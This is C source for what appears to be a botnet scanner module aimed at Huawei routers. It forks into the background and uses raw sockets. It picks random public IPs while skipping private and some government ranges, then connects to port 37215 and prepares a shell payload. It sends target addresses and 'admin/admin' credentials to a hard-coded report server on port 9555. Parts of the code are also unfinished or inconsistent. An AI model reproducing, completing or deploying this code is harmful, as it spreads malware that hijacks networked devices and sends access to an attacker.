#ifdef SELFREP
#define _GNU_SOURCE
#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include "includes.h"
#include "huawei_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
int huawei_scanner_pid = 0, huawei_rsck = 0, huawei_rsck_out = 0, huawei_auth_table_len = 0;
char huawei_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct huawei_scanner_auth *huawei_auth_table = NULL;
struct huawei_scanner_connection *conn_table;
uint16_t huawei_auth_table_max_weight = 0;
uint32_t huawei_fake_time = 0;
int huawei_ranges[] = {189,187,201,185,186,188,190,191,192,193,194,195,196,197,198,199,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
static void huawei_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1; if (plen == 0) plen = 1; 
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
int huawei_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
    if(ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    return ret;
}
void huawei_scanner(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    huawei_scanner_pid = fork();
    if(huawei_scanner_pid > 0 || huawei_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    huawei_fake_time = time(NULL);
    conn_table = calloc(HUAWEI_SCANNER_MAX_CONNS, sizeof(struct huawei_scanner_connection));
    for(i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = HUAWEI_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }
    if((huawei_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[huawei_scanner] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(huawei_rsck, F_SETFL, O_NONBLOCK | fcntl(huawei_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(huawei_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[huawei_scanner] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(huawei_rsck);
        exit(0);
    }
    do
    {
        source_port = rand_next() & 0xffff;
        huawei_fake_time = time(NULL);
        huawei_scanner_rawpkt[0] = 0x45;
        huawei_scanner_rawpkt[1] = 0x00;
        huawei_scanner_rawpkt[2] = 0x00;
        huawei_scanner_rawpkt[3] = 0x3c;
        huawei_scanner_rawpkt[4] = 0x00;
        huawei_scanner_rawpkt[5] = 0x00;
        huawei_scanner_rawpkt[6] = 0x00;
        huawei_scanner_rawpkt[7] = 0x00;
        huawei_scanner_rawpkt[8] = 0xff;
        huawei_scanner_rawpkt[9] = 0x06;
        huawei_scanner_rawpkt[10] = 0x00;
        huawei_scanner_rawpkt[11] = 0x00;
        huawei_scanner_rawpkt[12] = LOCAL_ADDR & 0xff;
        huawei_scanner_rawpkt[13] = (LOCAL_ADDR >> 8) & 0xff;
        huawei_scanner_rawpkt[14] = (LOCAL_ADDR >> 16) & 0xff;
        huawei_scanner_rawpkt[15] = (LOCAL_ADDR >> 24) & 0xff;
        iph = (struct iphdr *)huawei_scanner_rawpkt;
        tcph = (struct tcphdr *)&huawei_scanner_rawpkt[sizeof(struct iphdr)];
        huawei_setup_connection(&conn_table[i]);
        i = (i + 1) % HUAWEI_SCANNER_MAX_CONNS;
    }
    while(1);
    close(huawei_rsck);
}
void huawei_kill(void)
{
    if(huawei_scanner_pid > 0)
        kill(huawei_scanner_pid, 9);
}
static void huawei_setup_connection(struct huawei_scanner_connection *conn)
{
    struct sockaddr_in addr;
    if(conn->fd != -1)
        close(conn->fd);
    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[huawei_scanner] failed to call socket()\n");
        #endif
        return;
    }
    conn->dst_addr = get_random_huawei_ip();
    conn->dst_port = 37215; 
    conn->state = HUAWEI_SC_CONNECTING;
    conn->last_recv = huawei_fake_time;
    conn->rdbuf_pos = 0;
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    util_strcpy(conn->payload_buf, "sh\r\n"); 
    huawei_report(conn->dst_addr, htons(conn->dst_port), "admin", "admin");
}
static ipv4_t get_random_huawei_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        int range = rand() % (sizeof(huawei_ranges)/sizeof(int));
        o1 = huawei_ranges[range];
        o2 = tmp & 0xff;
        o3 = (tmp >> 8) & 0xff;
        o4 = (tmp >> 16) & 0xff;
    }
    while(o1 == 127 ||                             
          (o1 == 0) ||                              
          (o1 == 3) ||                              
          (o1 == 15 || o1 == 16) ||                 
          (o1 == 56) ||                             
          (o1 == 10) ||                             
          (o1 == 192 && o2 == 168) ||               
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    
          (o1 == 169 && o2 > 254) ||                
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     
          (o1 >= 224) ||                            
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) 
    );
    return INET_ADDR(o1,o2,o3,o4);
}
#endif
